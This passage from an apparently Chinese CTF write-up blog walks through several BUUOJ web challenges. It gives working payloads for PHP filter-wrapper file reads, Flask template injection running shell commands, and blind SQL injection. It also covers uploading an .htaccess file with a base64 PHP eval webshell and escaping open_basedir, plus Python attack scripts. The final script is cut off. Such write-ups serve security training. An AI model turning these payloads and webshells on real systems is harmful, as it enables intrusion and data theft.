punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span> <span class="token operator">=></span> <span class="token variable">$content</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我真绕不过去啊，wp</p><blockquote><p>json字符转译，json会将utf-8编码的字符自动转为原始字符</p></blockquote><p>这就好办了，直接将想读取内容中的flag进行utf-8编码即可，又因为下面对匹配flag的字符串进行了过滤，所以使用伪协议读取</p><pre class="line-numbers language-none"><code class="language-none">payload:POST&#123;&quot;page&quot;:&quot;\u0070\u0068\u0070:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;\u0066\u006c\u0061\u0067&quot;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>        <h2 id="RootersCTF2019-I-lt-3-Flask"   >          <a href="#RootersCTF2019-I-lt-3-Flask" class="heading-link"><i class="fas fa-link"></i></a><a href="#RootersCTF2019-I-lt-3-Flask" class="headerlink" title="[RootersCTF2019]I_&lt;3_Flask"></a>[RootersCTF2019]I_&lt;3_Flask</h2>      <p>SSTI很明显了，就是这个传参不好找，用个脚本Arjun用来爆参数的</p><pre class="line-numbers language-none"><code class="language-none">name&#x3D;&#123;&#123;url_for.__globals__[&quot;os&quot;].popen(&#39;cat flag.txt&#39;).read()&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>        <h2 id="NCTF2019-SQLi"   >          <a href="#NCTF2019-SQLi" class="heading-link"><i class="fas fa-link"></i></a><a href="#NCTF2019-SQLi" class="headerlink" title="[NCTF2019]SQLi"></a>[NCTF2019]SQLi</h2>      <p>贴心的提示，ban的可真多</p><pre class="line-numbers language-none"><code class="language-none">$black_list &#x3D; &quot;&#x2F;limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\&#39;|&#x3D;| |in|&lt;|&gt;|-|\.|\(\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep&#x2F;i&quot;;If $_POST[&#39;passwd&#39;] &#x3D;&#x3D;&#x3D; admin&#39;s password,Then you will get the flag;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>所有的注释都没了，PHP版本又&lt;5.3.4，使用00截断来裁切后面语句，构造payload</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">username&#x3D;\&amp;passwd&#x3D;||(passwd&#x2F;**&#x2F;regexp&#x2F;**&#x2F;&quot;^y&quot;);%00构造出的语句就是select * from users where username&#x3D;&#39;\&#39; and passwd&#x3D;&#39;||(passwd&#x2F;**&#x2F;regexp&#x2F;**&#x2F;&quot;^w&quot;);%00&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> time<span class="token keyword">from</span> urllib <span class="token keyword">import</span> parseurl<span class="token operator">=</span><span class="token string">"http://9ae4f74d-f7fe-4d73-8116-90698fc3d9d0.node4.buuoj.cn:81/index.php"</span>name<span class="token operator">=</span><span class="token string">"qwertyuiopasdfghjklzxcvbnm_&#125;&#123;0123456789"</span>flag<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> name<span class="token punctuation">:</span>        tmp<span class="token operator">=</span>flag<span class="token operator">+</span>j        data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'username'</span><span class="token punctuation">:</span><span class="token string">'\\'</span><span class="token punctuation">,</span>            <span class="token string">'passwd'</span><span class="token punctuation">:</span><span class="token string-interpolation"><span class="token string">f"||(passwd/**/regexp/**/\"^</span><span class="token interpolation"><span class="token punctuation">&#123;</span>tmp<span class="token punctuation">&#125;</span></span><span class="token string">\");</span><span class="token interpolation"><span class="token punctuation">&#123;</span>parse<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span><span class="token string">'%00'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        <span class="token punctuation">&#125;</span>        co<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>status_code        <span class="token keyword">if</span> co<span class="token operator">==</span><span class="token number">404</span><span class="token punctuation">:</span>            flag<span class="token operator">=</span>tmp            <span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token comment">#you_will_never_know7788990</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>脚本拿到password，再随便写一个除admin之外的user就行</p>        <h2 id="SUCTF-2019-EasyWeb"   >          <a href="#SUCTF-2019-EasyWeb" class="heading-link"><i class="fas fa-link"></i></a><a href="#SUCTF-2019-EasyWeb" class="headerlink" title="[SUCTF 2019]EasyWeb"></a>[SUCTF 2019]EasyWeb</h2>      <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function-definition function">get_the_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">// webadmin will remove your upload file every 20 min!!!! </span>    <span class="token variable">$userdir</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"upload/tmp_"</span><span class="token operator">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$userdir</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$userdir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$tmp_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$extension</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/ph/i"</span><span class="token punctuation">,</span><span class="token variable">$extension</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"^_^"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'&lt;?'</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token constant boolean">False</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"^_^"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">exif_imagetype</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"^_^"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token variable">$path</span><span class="token operator">=</span> <span class="token variable">$userdir</span><span class="token operator">.</span><span class="token string double-quoted-string">"/"</span><span class="token operator">.</span><span class="token variable">$name</span><span class="token punctuation">;</span>        @<span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">,</span> <span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$hhh</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'_'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$hhh</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$hhh</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'One inch long, one inch strong!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span><span class="token punctuation">,</span> <span class="token variable">$hhh</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Try something else!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$character_type</span> <span class="token operator">=</span> <span class="token function">count_chars</span><span class="token punctuation">(</span><span class="token variable">$hhh</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$character_type</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">12</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Almost there!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$hhh</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看代码，应该是让我们执行<code>get_the_flag</code>函数再上传文件getshell</p><p>首先是<span class="exturl"><a class="exturl__link"   href="https://blog.csdn.net/mochu7777777/article/details/104631142" >正则绕过</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>，使用异或绕过</p><pre class="line-numbers language-none"><code class="language-none">?_&#x3D;$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff&#x3D;get_the_flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>下一步就是走文件内容过滤绕过了</p><p>首先过了文件带ph后缀，然后检查文件中有没有&lt;?，最后通过<code>exif_imagetype</code>看看是不是图片</p><p>所有php类型文件想都不要想了，用.htaccess，但是如果直接添加幻数头会导致整个文件不被解析，所以新知识来辣</p><blockquote><p>exif_imagetype()函数是PHP中的内置函数，用于确定图像的类型。</p><p><strong>用法:</strong></p><pre class="line-numbers language-none"><code class="language-none">int exif_imagetype( string $filename )<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>参数：</strong>该函数接受单个参数$filename，该参数保存图像的名称或URL。</p><p><strong>返回值：</strong>此函数返回与IMAGETYPE常量之一相对应的整数，如下所示：</p><ul><li>IMAGETYPE_GIF(1)</li><li>IMAGETYPE_JPEG(2)</li><li>IMAGETYPE_PNG(3)</li><li>IMAGETYPE_SWF(4)</li><li>IMAGETYPE_PSD(5)</li><li>IMAGETYPE_BMP(6)</li><li>IMAGETYPE_TIFF_II(7)</li><li>IMAGETYPE_TIFF_MM(8)</li><li>IMAGETYPE_JPC(9)</li><li>IMAGETYPE_JP2(10)</li><li>IMAGETYPE_JPX(11)</li><li>IMAGETYPE_JB2(12)</li><li>IMAGETYPE_SWC(13)</li><li>IMAGETYPE_IFF(14)</li><li>IMAGETYPE_WBMP(15)</li><li>IMAGETYPE_XBM(16)</li><li>IMAGETYPE_ICO(17)</li><li>IMAGETYPE_WEBP(18)</li></ul></blockquote><p>只有当文件内容不属于以上任何一种图片类型的时候才会返回FALSE</p><p>而在.htaccess中有两个注释符号</p><pre class="line-numbers language-none"><code class="language-none">\x00#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>恰巧在图片中就有两种类型的图片是有这样开头的内容的</p><p>![](<span class="exturl"><a class="exturl__link"   href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-05-09" >https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-09</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 23.51.41.png)</p><blockquote><p>\x00\x00\x85\x85 只能放在文件开头位置</p></blockquote><blockquote><p>#define width 1337<br>#define height 1337<br>可以放在文件任意位置</p></blockquote><p>注意好这个就可以上传成功.htaccess文件啦</p><p>下面想想木马如何构造，由于对内容中的标签&lt;?进行了过滤，所以是不能使用任何已知的短标签绕过方法进行绕过的，并且在这个版本的PHP中，类似于<code>&lt;script language=&quot;php&quot;&gt;</code>这样的标签也是不生效的，骚操作来了，使用php伪协议用base64绕过，构造内容时在.htaccess中添加伪协议，最终构造出的shell和.htaccess文件如下</p><pre class="line-numbers language-none"><code class="language-none">.htaccess#define width 1000#define height 1000AddType application&#x2F;x-httpd-php .kkkphp_value auto_append_file &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;tmp_cc551ab005b2e60fbdc88de809b2c4b1&#x2F;kk.kkk&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> base64hta<span class="token operator">=</span><span class="token triple-quoted-string string">b'''#define width 1000#define height 1000AddType application/x-httpd-php .kkkphp_value auto_append_file "php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_cc551ab005b2e60fbdc88de809b2c4b1/kk.kkk"'''</span>hta<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'file'</span><span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token string">'.htaccess'</span><span class="token punctuation">,</span>hta<span class="token punctuation">,</span><span class="token string">"image/png"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>url<span class="token operator">=</span><span class="token string">"http://42c1f3d3-4023-4a55-822e-532aa2640e28.node4.buuoj.cn:81/?_=$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=get_the_flag"</span>res<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>files<span class="token operator">=</span>hta<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>shell <span class="token operator">=</span> <span class="token string">b"GIF89aaa"</span> <span class="token operator">+</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span><span class="token string">b"&lt;?php eval($_REQUEST['kkk']);?>"</span><span class="token punctuation">)</span>she<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'file'</span><span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token string">'kk.kkk'</span><span class="token punctuation">,</span>shell<span class="token punctuation">,</span><span class="token string">"image/png"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>res<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>files<span class="token operator">=</span>she<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上传并访问，成功</p><p>![](<span class="exturl"><a class="exturl__link"   href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-05-10" >https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-10</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 00.09.32.png)</p><p>可以看到禁用了巨多的函数，<del>其实这里搜索flag就能直接拿到flag了</del>，不能执行系统命令，open_basedir又被限制了，尝试<span class="exturl"><a class="exturl__link"   href="https://xz.aliyun.com/t/4720" >绕过</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><pre class="line-numbers language-none"><code class="language-none">payload:kkk&#x3D;chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);var_dump(scandir(&#39;&#x2F;&#39;));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后拿flag</p><pre class="line-numbers language-none"><code class="language-none">payload:kkk&#x3D;chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);echo file_get_contents(&#39;&#x2F;THis_Is_tHe_F14g&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>        <h2 id="NPUCTF2020-ezinclude"   >          <a href="#NPUCTF2020-ezinclude" class="heading-link"><i class="fas fa-link"></i></a><a href="#NPUCTF2020-ezinclude" class="headerlink" title="[NPUCTF2020]ezinclude"></a>[NPUCTF2020]ezinclude</h2>      <p>首先看源码提示，提示了pass内容，再看响应头中的Hash，直接传入，跳转flflflflag.php看内容中有个include，读取一把源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/data|input|zip/is'</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'nonono'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>@<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'include($_GET["file"])'</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>过滤了data，input，zip</p><p>新知识</p><blockquote><p>可以利用</p><p>php://filter/string.strip_tags</p><p>导致php崩溃，同时可上传文件保存在/tmp目录来上传木马。</p><p>利用条件：</p><ul><li>php7.0.0-7.1.2可以利用， 7.1.2x版本的已被修复</li><li>php7.1.3-7.2.1可以利用， 7.2.1x版本的已被修复</li><li>php7.2.2-7.2.8可以利用， 7.2.9一直到7.3到现在的版本已被修复</li><li>可以获取文件名</li><li>源代码将GET参数进行文件包含</li></ul></blockquote><p>构造python脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://eecf8a4a-cb71-40a6-9ff8-6e21849084dd.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd"</span>phpfile <span class="token operator">=</span> <span class="token string">"&lt;?php phpinfo(); ?>"</span>filedata <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"file"</span><span class="token punctuation">:</span>phpfile<span class="token punctuation">&#125;</span>bak <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> files<span class="token operator">=</span>filedata<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>bak<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时实例崩溃重启，但是/tmp中的内容依然保存，访问dir.php（目录扫描扫出来的）查看tmp中的内容，发现刚上传的文件，使用include包含后搜索flag拿到flag</p>        <h2 id="CISCN2019-华东南赛区-Double-Secret"   >          <a href="#CISCN2019-华东南赛区-Double-Secret" class="heading-link"><i class="fas fa-link"></i></a><a href="#CISCN2019-华东南赛区-Double-Secret" class="headerlink" title="[CISCN2019 华东南赛区]Double Secret"></a>[CISCN2019 华东南赛区]Double Secret</h2>      <p>进去访问/secret</p><pre class="line-numbers language-none"><code class="language-none">Tell me your secret.I will encrypt it so others can&#39;t see<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>传参数secret，输点乱七八糟的让它报错，看源码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span><span class="token punctuation">(</span>secret<span class="token operator">==</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">'Tell me your secret.I will encrypt it so others can\'t see'</span>rc<span class="token operator">=</span>rc4_Modified<span class="token punctuation">.</span>RC4<span class="token punctuation">(</span><span class="token string">"HereIsTreasure"</span><span class="token punctuation">)</span>   <span class="token comment">#解密</span>deS<span class="token operator">=</span>rc<span class="token punctuation">.</span>do_crypt<span class="token punctuation">(</span>secret<span class="token punctuation">)</span>a<span class="token operator">=</span>render_template_string<span class="token punctuation">(</span>safe<span class="token punctuation">(</span>deS<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token string">'ciscn'</span> <span class="token keyword">in</span> a<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">'flag detected!'</span><span class="token keyword">return</span> a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>就是对传入的secret进行RC4编码后再模版渲染</p><p>偷一个师傅的脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> quote<span class="token keyword">def</span> <span class="token function">rc4_main</span><span class="token punctuation">(</span>key <span class="token operator">=</span> <span class="token string">"init_key"</span><span class="token punctuation">,</span> message <span class="token operator">=</span> <span class="token string">"init_message"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># print("RC4加密主函数")</span>    s_box <span class="token operator">=</span> rc4_init_sbox<span class="token punctuation">(</span>key<span class="token punctuation">)</span>    crypt <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>rc4_excrypt<span class="token punctuation">(</span>message<span class="token punctuation">,</span> s_box<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span>  crypt<span class="token keyword">def</span> <span class="token function">rc4_init_sbox</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>    s_box <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># print("原来的 s 盒：%s" % s_box)</span>    j <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>        s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token comment"># print("混乱后的 s 盒：%s"% s_box)</span>    <span class="token keyword">return</span> s_box<span class="token keyword">def</span> <span class="token function">rc4_excrypt</span><span class="token punctuation">(</span>plain<span class="token punctuation">,</span> box<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># print("调用加密程序成功。")</span>    res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    i <span class="token operator">=</span> j <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> s <span class="token keyword">in</span> plain<span class="token punctuation">:</span>        i <span class="token operator">=</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>        j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> box<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>        box<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> box<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> box<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> box<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        t <span class="token operator">=</span> <span class="token punctuation">(</span>box<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> box<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>        k <span class="token operator">=</span> box<span class="token punctuation">[</span>t<span class="token punctuation">]</span>        res<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">^</span> k<span class="token punctuation">)</span><span class="token punctuation">)</span>    cipher <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span 